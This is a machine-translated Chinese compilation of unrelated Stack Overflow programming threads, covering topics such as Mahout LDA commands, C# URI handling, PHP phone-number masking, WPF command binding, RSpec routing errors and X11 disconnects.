任何有关如何执行此操作的信息或示例将不胜感激！

谢谢！

更新：

**好的，所以我解决了这个问题，但它仍然不完整，所以任何帮助都会很棒！**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T22:29:59.457

好的，所以我仍然不知道如何输出主题，但是我已经弄清楚了如何获取 cvb 以及我认为是文档向量的方法，但是我没有运气转储它们，所以这里的帮助仍然会不胜感激！

哦，别忘了设置以下值：

```
export MAHOUT_HOME=/home/sgeadmin/mahout
export HADOOP_HOME=/usr/lib/hadoop
export JAVA_HOME=/usr/lib/jvm/java-6-openjdk
export HADOOP_CONF_DIR=$HADOOP_HOME/conf 
```

在主人身上，否则这些都不起作用。

因此，首先使用 starclusters put 上传文档（显然，如果您不使用 starcluster，请跳过此 :)）：

```
starcluster put mycluster text_train /home/sgeadmin/
starcluster put mycluster text_test /home/sgeadmin/ 
```

然后我们需要将它们添加到 hadoop 的 hbase 文件系统（不要忘记 -hadoop starcluster）：

```
dumbo put /home/sgeadmin/text_train /user/sgeadmin/ -hadoop starcluster 
```

然后调用 Mahout`seqdirectory`将文本转换为序列文件

```
$MAHOUT_HOME/bin/mahout seqdirectory --input /user/sgeadmin/text_train --output /user/sgeadmin/text_seq -c UTF-8 -ow 
```

然后调用 Mahout`seq2parse`将它们变成向量

```
$MAHOUT_HOME/bin/mahout seq2sparse -i text_seq -o /user/sgeadmin/text_vec -wt tf -a org.apache.lucene.analysis.WhitespaceAnalyzer -ow 
```

最后 call `cvb`，我相信`-dt`标志说明推断的主题应该去哪里，但是因为我还没有能够转储它们，所以我无法确认这一点。

```
$MAHOUT_HOME/bin/mahout cvb -i /user/sgeadmin/text_vec/tf-vectors -o /user/sgeadmin/text_lda -k 100 -nt 29536 -x 20 -dict /user/sgeadmin/text_vec/dictionary.file-0 -dt /user/sgeadmin/text_cvb_document -mt /user/sgeadmin/text_states 
```

`-k`flag 是主题的数量，flag`-nt`是字典的大小，您可以通过计算`dictionary.file-0`向量内部的条目数（在本例中为 下`/user/sgeadmin/text_vec`）来计算它，并且`-x`是迭代次数。

如果有人知道如何从这里获取文档主题概率，我们将不胜感激！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-19T23:42:53.143

文档主题分布以序列文件格式存储在您使用`-dt`或`--doc_topic_output`运行时指定的目录下`mahout cvb`。在您的情况下，此目录将是`/user/sgeadmin/text_cvb_document`

要将这些序列文件的内容转储到文本文件，您可以使用`mahout vectordump`如下实用程序：

```
mahout vectordump -i /path/to/doc_topic_seq_input -o /path/to/doc_topic_text_out -p true -c csv 
```

在哪里：

```
-i    Path to input directory containing document-topic distribution in sequence file format.
-o    Path to output file that will contain your document-topic distribution in text format.
-p    Key values will be displayed if this parameter is used.
-c    Output the Vector as CSV, otherwise it substitutes in the terms for vector cell entries 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-01T13:16:43.363

```
After completing aboveprocess,you can obtain an output of the computed topics using another Mahout utility called LDAPrintTopics.java by passing following commands

--dict (-d) dict  --------->Dictionary to read in, in the same
                                           format as one created by
                                           org.apache.mahout.utils.vectors.lucen
                                           e.Driver
  --output (-o) output--------->Output directory to write top words
  --words (-w) words--------->Number of words to print
  --input (-i) input--------->Path to an LDA output (a state)
  --dictionaryType (-dt) dictionaryType--------->The dictionary file type
                                           (text|sequencefile) 
```

# c# - 我应该如何获取 URI 的特定部分

> ID：11651716
> 
> 赞同：3
> 
> 时间：2012-07-25T14:11:25.207
> 
> 标签：c#, request, uri

如果我有 URI "http://www.test.com/something" 并且我想要 "www.test.com" 部分。我应该使用什么？（什么是最好的）

*   [Request.Url.DnsSafeHost](http://msdn.microsoft.com/en-us/library/system.uri.dnssafehost.aspx)
*   [请求.Url.Host](http://msdn.microsoft.com/en-us/library/system.uri.host.aspx)
*   [Request.Url.Authority](http://msdn.microsoft.com/en-us/library/system.uri.authority.aspx)

[我在CHAT](https://chat.stackoverflow.com/transcript/message/4668456#4668456)中问过这个问题，但没有那么幸运。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T14:26:08.743

坚持使用`Request.Url.Authority`，因此如果您的主机有另一个端口而不是`80`，它将显示（如果这对您很重要）。

* * *

**例子：**

```
Uri baseUri = new Uri("http://www.test.com:8888/something");
Console.WriteLine(myUri.Authority);
Console.WriteLine(myUri.Host); 
```

* * *

**输出：**

> www.test.com:8888
> www.test.com

* * *

如果您只想向用户显示主机部分，则无需费心`DnsSafeHost`。如果您需要将 IPv6 地址转换为名称解析，则可以使用`http://[fe80::200:39ff:fe36:1a2d%4]/temp/example.htm`它`fe80::200:39ff:fe36:1a2d%4`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-25T14:26:41.490

正如评论所述，您打算使用主机名的目的可能很重要。

一般来说，我会使用 [Uri.Authority](http://msdn.microsoft.com/en-us/library/system.uri.authority.aspx)，或者组合我需要的组件。

权限提供了两个关键组件来定位服务：1）主机名 2）端口。其他两个属性只给你主机名。

例如，如果我访问的网站不是托管在默认端口上，而是例如 81 (http://example.com:81)，我也想知道端口号。

# c# - C# 正则表达式拆分街道地址 - 南非

> ID：11651718
> 
> 赞同：3
> 
> 时间：2012-07-25T14:11:27.097
> 
> 标签：c#, regex

> **可能重复：**
> [用于解析邮寄地址的正则表达式](https://stackoverflow.com/questions/642602/regular-expression-for-parsing-mailing-addresses)

我需要拆分具有两种形式之一的街道地址。

```
12B 主干道
主干道 12B

```

（所有部分都是可选的）

我需要拆分为街道名称（主要）、街道类型（道路，已经有可能的街道类型列表）、街道编号（12）和街道编号后缀（B）。

有什么建议吗？

将在 C# 中执行此操作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:27:22.580

考虑到我不知道所有的细节（你怎么能期望道路被格式化），这个问题很难回答，但我会尽我所能。

对于您的 2 个具体示例，您可以拥有

`@"([\d|A-Z]*) ([A-Z|a-z| ]*) ([A-Z|a-z]*)"`

将与您的第一个答案的顺序相匹配

`@"([A-Z|a-z| ]*) ([A-Z|a-z]*) ([\d|A-Z]*)"`

将匹配您的第二个答案。

例子：

```
 Regex regex = new Regex(@"([\d|A-Z]*) ([A-Z|a-z| ]*) ([A-Z|a-z]*)");

        foreach (Group g in regex.Match("12B Main Road").Groups)
        {

            Console.WriteLine(g.Value);
        } 
```

该程序的输出如下所示

```
12B Main Road
12B
Main
Road
Press any key to continue . . . 
```

使用[Regex Cheat Sheet](http://www.mikesdotnetting.com/Article/46/CSharp-Regular-Expressions-Cheat-Sheet)获取有关如何修改它的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:31:37.173

你应该这样做：

```
Match m1 = Regex.Match(input, @"^(?<number>\d+[A-Z]?)?((?<name>[a-zA-Z]+)\s)?(?<type>Road|Drive|AndSoOn)?$")
Match m2 = Regex.Match(input, @"^(?<name>[a-zA-Z]+)?\s(?<type>Road|Drive|AndSoOn)?(?<number>\d+[A-Z]?)?$"); 
```

然后检查 Success 属性并对 Regex.Groups 采取措施。无论如何，您的要求很肤浅，甚至指向不安全的解决方案。

# c# - 如何在kmplayer和winamp中获取当前播放媒体的路径？

> ID：11651719
> 
> 赞同：0
> 
> 时间：2012-07-25T14:11:32.337
> 
> 标签：c#, winamp

我想编写一个应用程序（在 c# 中），它将在 kmplayer 或 winamp 开始播放视频时开始，并且需要知道视频文件的路径，我该怎么做？

**编辑：**
经过一些搜索、编码和测试，现在我可以使用[sharpamp](https://github.com/Daniel15/Sharpamp) wrapper来做到这一点，当我用winamp打开我的媒体文件时，所有的事情都可以，但使用kmplayer，文件名总是空的。我用于获取文件名的插件代码如下所示：

```
public class ThePlugin : GeneralPlugin
{
    public override void Initialize()
    {
        if (!string.IsNullOrEmpty(Winamp.CurrentSong.Filename))
        {
            MessageBox.Show(Winamp.CurrentSong.Filename);
        }
        else
        {
            MessageBox.Show("File name is empty. ");
        }
    }
} 
```

使用 km 的结果是“文件名为空”。
在*sharpamp的**Winamp*类中，有一个名为“UpdateSongData”的方法，其中包含这行代码：

 *```
string filename = SendIPCCommandString(IPCCommand.GetFilename); 
```

此代码用于获取播放媒体的文件名，所以这两个播放器中的“GetFilename”（这里是：3031）的IPC命令可能彼此不同？还是问题是另一回事？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:39:23.353

也许有一个更简单的方法，但你可以尝试反复为 winamp 做这样的事情（完全未经测试）：

```
Process[] processes = Process.GetProcessesByName("winamp");
foreach (Process p in processes)
{
    string winampTitle = p.MainWindowTitle;

    // Check the title to see if it contains a video filename, and do
    // something with it..
} 
```*

# sql-server - 子查询 X 临时表 X 动态 sql X 表值函数

> ID：11651726
> 
> 赞同：1
> 
> 时间：2012-07-25T14:11:38.763
> 
> 标签：sql-server, performance, subquery, dynamic-sql, table-variable

我的观点总结了我的物品的很多信息。我们称之为 v_item_details。

此视图是通过递归 cte 定义的，如果未应用正确的过滤，可能会变得非常慢。基本上，如果我提供项目 ID 列表，事情就会顺利进行。所以像`SELECT * FROM v_item_details WHERE item_id IN(1,2,3)`在 1 秒内运行的东西。

当我尝试获取在另一个表中定义的一组项目的项目详细信息时，事情变得复杂了。`SELECT * FROM v_item_details WHERE item_id IN (SELECT item_id FROM items WHERE group_id = 1)`即使 group_id 已编入索引并且子查询返回与先前查询（1,2 和 3）相同的 item_id，该查询仍将花费 1 分钟。

我尝试创建一个表变量并将子查询的结果插入其中，然后对其进行连接，但仍然需要 1 分钟以上。

接下来，我尝试使用接收 item_id 作为参数的表值函数来包装我的视图，然后执行交叉应用，以尝试强制执行与简单选择相同的计划，但这需要 4 分钟！

现在我正在使用一个动态查询来选择 ID，然后执行快速子查询。但这不是最理想的，因为现在我被存储过程困住了，而不是我可以进一步操纵的视图。

关于如何强制 SQL 首先选择子查询中的值然后运行快速子查询的任何想法？我认为使用 LOOP 连接查询提示会起作用，但它没有，因为虽然它确实从子查询开始执行循环，但视图的查询计划与快速查询不同，所以我仍然有性能问题。

最好的问候，卡洛斯·乔丹

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T08:25:33.553

有一个我们可以在我们自己的 SQL Server 实例上构建的实例来重现和诊断问题会很有帮助。如果没有，我可能会尝试以下几件事：

*   确保`items`表上的统计信息是最新的
*   尝试使用 JOIN 而不是 IN 子句（我知道这些通常应该是相同的，但在某些情况下它们的行为非常不同，例如使用 COLUMNSTORE 索引，所以递归 CTE 也可能存在怪癖）
*   确保使用的表`vw_item_details`具有正确的主键和/或索引
*   尝试仅选择您需要的列，而不是 * from `vw_item_details`（一个长镜头，但你永远不知道......）

# qt - 如何在 Qt OpenGL 中应用 glPointSize(float)？

> ID：11651732
> 
> 赞同：1
> 
> 时间：2012-07-25T14:11:59.687
> 
> 标签：qt, opengl, qwidget, glpointsize

我刚开始研究 Qt OpenGL。我可以用它在屏幕上画一些简单的形状。我需要在 QWidget 的屏幕上绘制各种大小的点。我为此使用了标准`glPointSize(float)`。这似乎不起作用。我为此编写了一个命令行程序，并且运行良好。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:41:44.247

大概您是在 QGlWidget 而不是 QWidget 中执行此操作？
你还记得 glBegin(GL_POINTS) 吗？

你的意思是你看不到点或大小变化没有效果？
大小值是任意的，有时您必须指定一个更大的值（10 或 20）才能看到从 1 的任何变化。

# cakephp - 在 CakePHP 中，如何使表中的数据对所有控制器可用

> ID：11651741
> 
> 赞同：0
> 
> 时间：2012-07-25T14:12:22.070
> 
> 标签：cakephp, controller

我在数据库中有一个国家和代码列表。我希望能够将这些数据放入 AppController 中的数组中，以便我可以通过 $this->countries 在我的其他控制器中使用它。一种 $this->App->query() 如果你喜欢的话。请问我该怎么做:) 提前谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:15:36.797

在您的 AppController 中放置：

```
public $uses = array('Country'); //list of models
public $countries = $this->Country->find('all'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:15:41.167

你为什么不直接用模型加载国家？

您可以在每个控制器中使用该模型（至少我认为）。
这应该可以工作：`$this->Country->find('all')`

如果你不想每次都写这个，你也可以把它移到一个助手中。

# jsf - JSF & Hashmap：访问值属性

> ID：11651742
> 
> 赞同：-1
> 
> 时间：2012-07-25T14:12:23.570
> 
> 标签：jsf, jakarta-ee

我有一个由以下定义的哈希图：

```
Map<String, Person> map = new HashMap<String, Person>(); 
```

它被一些数据填充。这是在 EJB bean 中。

在 JSF 中，我想以某种方式访问​​ Person 类的属性：

```
#{bean.map['key'].username} 
```

但是 JSF 不允许我这样做。

例如，如果我用字符串替换 Person ，它就可以工作。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-26T07:47:05.423

一个解决方案可能是编写您自己的自定义 EL 函数：

```
public static Object getMapValue(Map map, Object key) {
    return map.get(key);
} 
```

然后你可以像这样访问它：

```
#{fn:getMapValue(bean.map, 'key').username} 
```

如果您不熟悉自定义 el 函数，请查看：[Facelets EL 函数可以节省您的时间](http://faces.eti.br/2008/11/02/facelets-el-functions-can-save-your-day/)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-02-16T17:04:53.463

在Bean中写一个函数

```
public Person getMapValue(String key)
{
        return map.get(key);
} 
```

然后你可以像这样访问它：

```
#{bean.getMapValue('key').username} 
```

# php - preg_replace 屏蔽部分电话号码

> ID：11651744
> 
> 赞同：1
> 
> 时间：2012-07-25T14:12:43.553
> 
> 标签：php, regex, masking

好的，所以在重新阅读了我之前的帖子寻求帮助之后，我发现我并没有完全清楚我在尝试做什么，也没有指出原因。我有一个正在忙于开发的网站，它可能会显示人们留下电话号码的消息（即使这很愚蠢），我需要负责并确保在这种情况下数字被屏蔽。首先，我需要搜索存储在变量 $messagetext 中的消息文本，然后我需要使用 preg_replace() 函数来屏蔽部分数字，因此不清楚数字是什么，所以如果有人要留言和他们的号码是“07921234567”，它会在消息中显示为“07**12*45**”。这将如何完成？我只想找出我的功能

```
$extractednum = preg_replace( "/[0-9]/","*",$extractednum);
echo ($extractednum); 
```

所有这一切都是替换整个数字。我不想这样做的原因是我还有另一个网站我正在处理社交网络隐私，我需要屏蔽我为我的示例检索到的部分电话号码。

希望这更清楚，如果有人可以帮助我提供一些很棒的代码！

任何事情都值得赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:18:28.853

我认为您正在寻找的正则表达式是这样的：

```
(00447|\+?447|07)([0-9]{9}) 
```

要屏蔽电话号码，您需要一个带有 的自定义回调[`preg_replace_callback()`](http://php.net/preg_replace_callback)，如下所示：

```
$extractednum = preg_replace_callback( "/(00447|\+?447|07)([0-9]{9})/", function( $matches) {
    // This will return the number unmodified
    // return $matches[1] . $matches[2]; 
    // Instead, set whichever characters you want to be "*" like this:
    $matches[2][0] = $matches[2][1] = $matches[2][4] = $matches[2][7] = $matches[2][8] = "*";
    return $matches[1] . $matches[2]; 
} , $extractednum); 
```

[您可以在演示](http://viper-7.com/kpmd2c)中看到它的工作原理。例如，`07921234567`产量`07**12*45**`作为输出的输入。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:19:49.593

我不确定有效的英国电话号码中有多少个号码。假设有 11 个数字：

```
preg_replace(/(\d{2})\d{2}(\d{2})\d(\d{2})\d{2}/, "$1**$2*$3**"); 
```

这不是一个很好的解决方案，因为我猜可能会有不同长度的电话号码，人们可以在号码中放置空格以达到视觉目的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-06T14:45:42.273

```
<?PHP
function maskTelephoneNumber($phonenumber, $trim, $maskCharacter)
{
$suffixNumber = substr($phonenumber, strlen($phonenumber)-$trim,$trim); 
$prefixNumber = substr($phonenumber, 0, -$trim); 

for ($x = 0; $x < strlen($prefixNumber); $x++):
    $str.= ( is_numeric($prefixNumber[$x]) )? str_replace($prefixNumber[$x], $maskCharacter, $prefixNumber[$x]) : $prefixNumber[$x];
endfor;

return  $str.$suffixNumber;     
}

$trim = 4;
$maskCharacter='*';
$phonenumber = '555-666-7777';

echo maskTelephoneNumber($phonenumber,$trim, $maskCharacter); 
```

# c# - 如何将 ICommand 添加到来自 FrameworkElement 的事件？

> ID：11651745
> 
> 赞同：2
> 
> 时间：2012-07-25T14:12:43.747
> 
> 标签：c#, xaml, mvvm

如何`ICommand`从 中添加到事件`FrameworkElement`？

具体来说，我想做以下事情

```
<ListView> <!-- Button, Windows or whatever element -->
    <my:EventToCommand 
        Name="PreviewMouseLeftButton"
        Command="{Binding Path=MyCommand}"
        CommandParameter="{Binding ...}" />
    <!-- Value, Element, etc.. -->
</ListView> 
```

我想实现自己的解决方案，用于教育目的，我不想使用任何第三方库（MVVM Light、Prism 等）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T14:27:03.407

您需要使用附加行为。出于演示目的，假设我想使用 MVVM 和 ICommand 模式实现 Button Double Click，以下是相关代码：

首先，创建一个名为 ButtonBehaviors 的静态类，如下所示：

```
public static class ButtonBehaviors
{
    public static object GetButtonDoubleClick(DependencyObject obj)
    {
        return obj.GetValue(ButtonDoubleClickProperty);
    }

    public static void SetButtonDoubleClick(DependencyObject obj, object value)
    {
        obj.SetValue(ButtonDoubleClickProperty, value);
    }

    public static readonly DependencyProperty ButtonDoubleClickProperty =
        DependencyProperty.RegisterAttached("ButtonDoubleClick", typeof (object), typeof (ButtonBehaviors),
                                            new UIPropertyMetadata(new PropertyChangedCallback(OnButtonDoubleClickChanged)));

    private static void OnButtonDoubleClickChanged (DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
        var button = d as Button;
        if(button == null)
        {
            return;
        }

        var command = e.NewValue as ICommand;
        if(command == null)
        {
            return;
        }

        button.MouseDoubleClick += (o, ev) => command.Execute(button);
    }
} 
```

（我会在一秒钟内解释）

然后，这里是你将如何使用它：

MainWindow.xaml：

```
<Window x:Class="WpfApplication3.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:WpfApplication3="clr-namespace:WpfApplication3" Title="MainWindow" Height="350" Width="525">
    <Grid>
        <Button Content="Button" 
                Height="23" 
                HorizontalAlignment="Left" 
                Margin="173,89,0,0" 
                VerticalAlignment="Top" 
                WpfApplication3:ButtonBehaviors.ButtonDoubleClick="{Binding ButtonDoubleClick}"
                Width="75" />
    </Grid>
</Window> 
```

最后，ViewModel：

```
public class ViewModel
{
    private ICommand _buttonDoubeClick;

    public ICommand ButtonDoubleClick
    {
        get
        {
            if (_buttonDoubeClick == null)
            {
                _buttonDoubeClick = new SimpleDelegateCommand(() => MessageBox.Show("Double click!!"));
            }

            return _buttonDoubeClick;
        }
    }
} 
```

只是为了完整起见，因为你说没有第三方 dll，所以这是我的 SimpleDelegateCommand：

```
public class SimpleDelegateCommand : ICommand
{
    private readonly Action _action;

    public SimpleDelegateCommand(Action action)
    {
        _action = action;
    }

    public bool CanExecute(object parameter)
    {
        return true;
    }

    public event EventHandler CanExecuteChanged;

    public void Execute(object parameter)
    {
        if(_action != null)
        {
            _action();
        }
    }
} 
```

简而言之，发生的事情是这样的：当您将 Command 分配给附加属性时，会引发 OnButtonDoubleClickChanged 事件，此时我们会连接到 button.MouseDoubleClick 事件。

# powershell - powershell 从文本文件返回值

> ID：11651746
> 
> 赞同：-2
> 
> 时间：2012-07-25T13:31:54.523
> 
> 标签：powershell

我有一个带有用户 ID 的文本文件。

userA userB userC etc 此文本文件每天都会根据需要更改。

问，如何使用 powershell 从文本文件中返回用户的某些属性？我正在寻找的是

用户 ID、电子邮件地址、SIP、ExchangeServer、StorageGroup、数据库、LegacyExchangeDN 等......

感谢所有帮助...

谢谢邦尼奥

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:51:57.713

所以假设你有一个像这样的名为 test.txt 的文本文件

```
1,bob,QA
2,Fred,Dev
3.John,IT
11,rob,dev 
```

您可以使用[select-string](http://technet.microsoft.com/en-us/library/ff730968)轻松获取信息

```
 PS C:\Users\Adam\Documents> Select-String 2 test.txt

 test.txt:2:2,Fred,Dev 
```

但这有一些限制，因为模式是正则表达式，如果我们使用 1 我们将匹配两条记录

```
PS C:\Users\Adam\Documents> Select-String 1 test.txt

test.txt:1:1,bob,QA
test.txt:4:11,rob,dev 
```

这可以通过更复杂的正则表达式来解决，但另一种选择是将[where-object](http://technet.microsoft.com/en-us/library/ee177028.aspx)与 get-content 结合使用并提供条件

```
get-content test.txt| where-object {$_.split(",")[0] -eq 1 } 
```

在这种情况下，我已经阅读了每一行并通过拆分它然后比较第一个元素来评估该行

# ruby-on-rails - 测试：没有路由匹配 {:action=>"show", :controller=>"users", :id=>nil}

> ID：11651753
> 
> 赞同：0
> 
> 时间：2012-07-25T14:13:23.380
> 
> 标签：ruby-on-rails, testing, rspec, routes

我只有 2 周的时间学习 ruby​​ 和 ruby​​ on rails。目前我的问题是与 te 路线匹配我不太了解，现在我正在使用 rspec 进行测试：

```
require 'spec_helper'

describe UsersController do

it "should redirect to the user show page" do
post :create, :users => @attr
response.should redirect_to(user_path(assigns(:users)))
end
  describe "signup" do

before { visit new_user_registration_path }

let(:submit) { "Sign up" }

describe "with invalid information" do
  it "should not create a user" do
    expect { click_button submit }.not_to change(User, :count)
  end
end

describe "with valid information" do
  before do
    fill_in "Email", :with=> "user@example.com"
    fill_in "Password", :with=> "foobar"
    #fill_in "password_confirmation", :with=> "foobar"
  end

  it "should create a user" do
    expect { click_button submit }.to change(User, :count).by(1)
  end
end
end
end 
```

我的 UserController 上有这个

```
class UsersController < ApplicationController

def new
     @user = User.new
end

def create
    @user = User.new(params[:user])
    if @user.save
        redirect_to user_session_path
    else
    redirect_to new_user_session_path
end

end

def show
    @user = User.find(params[:id])
    #redirect_to @user
end
end 
```

但是当我运行测试时，我得到了这个错误：

```
Failures:

1) UsersController should redirect to the user show page
   Failure/Error: response.should redirect_to(user_path(assigns(:users)))
   ActionController::RoutingError:
   No route matches {:action=>"show", :controller=>"users", :id=>nil}
   # ./spec/controllers/user_controller_spec.rb:7

2) UsersController signup with valid information should create a user
   Failure/Error: expect { click_button submit }.to change(User, :count).by(1)
   count should have been changed by 1, but was changed by 0
   # ./spec/controllers/user_controller_spec.rb:29 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:16:57.607

在您的规范中，您两次提到用户（复数）而不是用户（单数）：

```
it "should redirect to the user show page" do
  post :create, :user => @attr
  response.should redirect_to(user_path(assigns(:user)))
end 
```

应该通过。

**更新**：

如果没有设置@attr，你当然应该正确设置它。只需为模型提供包含所有属性和值的哈希。假设用户模型具有属性名称和地址：

```
@attr = { :name => "SomeUserName", :address => "SomeAddress"} 
```

# php - 我想知道如何将双精度值作为数组传递并在另一端接收它们，这就是我的代码：

> ID：11651755
> 
> 赞同：0
> 
> 时间：2012-07-25T14:13:23.693
> 
> 标签：php

我正在尝试传递一个双精度值，它们是标签中的数组。如何在另一侧接收和拆分阵列？这是我拥有的代码：

```
<?php
 print("<select name='dsc[]' multiple='multiple' id='searchable-select' multiple>");
//Create new SQL object  
$db = new NSC_SQL($db2config);
$db->from($qadbifld, "dbifld, substr(dbitxt,1,25) as FLDTEXT");
$db->where("upper(dbiatr)='PF' and (DBILIB='".$nscmod72d."' or DBILIB='".$aedata72."')    ");
$db->group("dbitxt,dbifld");
$db->order("dbitxt,dbifld");
$db->select();
$results = $db->fetchAssoc();
foreach($results as $row)
{
    $fieldName = trim($row['DBIFLD']);
    $fieldDesc = trim($row['FLDTEXT']);
    print("<option VALUE='$fieldDesc,$fieldName'>$fieldDesc  -  $fieldName  </option>");
}
print("</select>");
?> 
```

这就是我试图在另一边接收它的方式：

```
<?PHP
 $dsc = $_POST['dsc'];
 list($fieldDesc, $fieldName) = explode(":", $dsc);
//Put the elements of the array in hidden fields here!
print_r($fieldDesc);
print_r($fieldName);
foreach ($fieldDesc as $key => $value1)
{
    echo "<input type=hidden name='dsc[]' value='$value1'>";
}
?> 
```

这是用 PHP 编写的

它必须是这种方式，以便只有一个选项被传递给多选框。感谢你们为我提供的任何帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:15:48.233

您似乎将这些值与 连接在一起`,`，然后将它们与 分开`:`。您必须使用相同的分隔符来连接和拆分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:46:14.523

您有多个选择元素

考虑下面的代码

```
<?php
if(isset($_POST) && !empty($_POST)){
    $dsc = $_POST['dsc'];

    foreach ($dsc as $val){

        $data = explode(",", $val);
        $fieldDesc = $data[0]; 
        $fieldName = $data[1];

        echo "<input type=hidden name='dsc[]' value='$fieldDesc'>";
    }
}

?>

<form action="" method="post">
<select name='dsc[]' multiple='multiple' id='searchable-select' multiple size="7">
    <option value="a,1">a,1</option>
    <option value="b,2">b,2</option>
    <option value="c,3">c,3</option>
    <option value="d,4">d,4</option>
    <option value="e,5">e,5</option>
</select>
<input type="submit" value="Submit"></input>
</form> 
```

如果你不知道让我知道

# java - 远程摇摆应用程序上的“x 连接主机断开”

> ID：11651757
> 
> 赞同：1
> 
> 时间：2012-07-25T14:13:31.180
> 
> 标签：java, swing, crash, x11, jvm-crash

我的系统：我有一个 java swing 应用程序，它在没有监视器的 Solaris 10/X86 机器上运行。我有另一台机器（Linux/x86），我通过 X11 显示应用程序。

我的问题：我的应用程序在 30 台机器上运行，24/7。有时 jvm 会因错误“X 连接主机损坏。”而崩溃。我的应用程序运行了数周并且从未崩溃，其他应用程序在 1 天后崩溃一次，而其他应用程序每周崩溃。很随意。

我做了什么/检查了什么：所有应用程序的 I/O 都非常相似，它有点网络密集但没有过度。内存、cpu 和磁盘使用情况也相似。有些机器比其他机器使用得更多，但与崩溃无关。Linux/x86 上的 X 从未崩溃。网络似乎没问题，检查了交换机和 netstat。

我添加了 SignalHandlers 但找不到任何东西。检查内存泄漏和其他应用程序问题，但找不到任何东西。

我需要什么：1）我该如何进一步调查？我怎样才能找到 x 连接中断的原因？2) 我怎样才能让我的应用程序“X11 崩溃”证明？有可能的？！要recconect还是什么？3) 这种“连接中断”问题是否有常见原因？或者任何常见的解决方案？（不，我不能无头运行=））

当然 jvm 没有为我生成任何核心 =(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T15:00:56.743

X11 通常通过 TCP/IP 连接运行；如果该连接因任何原因中断（网络关闭、DHCP 地址更改等），您将失去 X 连接。如果服务器对客户端显示具有权限（主机），您可以想象只打开一个新的显示连接，但如果客户端已打开与服务器的终端会话以启动应用程序，您可能也会丢失终端会话网络中断。

# vb.net - 你能以编程方式隐藏outlook中的任务吗

> ID：11651758
> 
> 赞同：0
> 
> 时间：2012-07-25T14:13:35.363
> 
> 标签：vb.net, outlook, add-in

我正在寻找开发一个 Outlook 加载项来管理任务。我希望 Outlook 任务只能在此加载项中查看，而在常规任务窗格中不可见。这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:31:49.427

您可能想尝试查看过滤器。在 Outlook 2010 中，它们位于查看 -> 查看设置 -> 过滤器 -> 高级。默认情况下已经设置了两个过滤器。如果您利用它们，它们可能会很有用，因此您可以以编程方式修改任务以使您的任务被过滤。我很肯定您将能够以编程方式设置更多过滤器。例如，为了隐藏任务，您可以为类别 -> 包含 -> '隐藏' 指定一个过滤器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-26T13:47:37.233

我有另一个建议，您可以将自己的 .net 表单 (system.windows.forms.form) 放在包含标准任务项的所有 Outlook 文件夹的任务列表中，并在该表单中显示您自己的任务。是你要找的吗？

最好的问候， Dmitry Kostochko Add-in Express Ltd.

# c# - 在一行中更改多个变量？

> ID：11651760
> 
> 赞同：1
> 
> 时间：2012-07-25T14:13:36.830
> 
> 标签：c#, .net

可以说我有这个

```
int x = 0;
int y = 0;
int z = 0;
const int v = 50;

//change x,y,z
x += v;
y += v;
z += v; 
```

很好，但是有没有更短的方法来避免这 3 行代码（带有`+=`）并且只有一个？我只是问自己，因为我必须经常向这些变量添加一些 const，然后我必须总是添加 +3 行（或者如果我有 xyz+ 变量则更多）。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-25T14:17:23.430

如果这种情况经常发生，您可能希望将这些放在一个类中。例如，如果这些是虚拟页面中的位置：

```
class PageLoc
{
    public int Header { get; set; }
    public int Body { get; set; }
    public int Footer { get; set; }

    void MoveAll(int distance) {
        Header += distance;
        Body += distance;
        Footer += distance;
    }
} 
```

这样，您可以单独或集体更改它们的值。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-25T14:20:55.507

您可以定义一个方法来递增所有三个变量并通过引用传递变量：

```
Add(ref x, ref y, ref z, 50); 
```

和

```
void Add(ref int x, ref int y, ref int z, int v)
{
    x += v;
    y += v;
    z += v;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:18:24.580

将 x,y,z 包装到一个类中并编写一个方法来为所有三个添加一个常量：

```
class XYZ
{
  public void Add (int v) { x += v; y += v; z += v; }
  int x,y,x;
} 
```

上面使用的一些代码：

```
void F ()
{
  XYZ xyz;

  xyz.Add (3);
} 
```

当然，您可以通过重载 += 运算符以及其他运算符来改进上述内容。实际上，您已经创建了一个向量，并且有可用的库已经实现了它（可能在 DirectX 中）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-25T14:30:19.363

```
z += 0 * (y += 0 * (x += v) + v) + v; 
```

塔达：D

**但是我不推荐使用这个！**当然，更好的方法是创建一个方法来做到这一点。那也只会给你一行（+一个方法声明）。

# jquery - Slim Jquery Mobile UI（无页面角色）

> ID：11651761
> 
> 赞同：2
> 
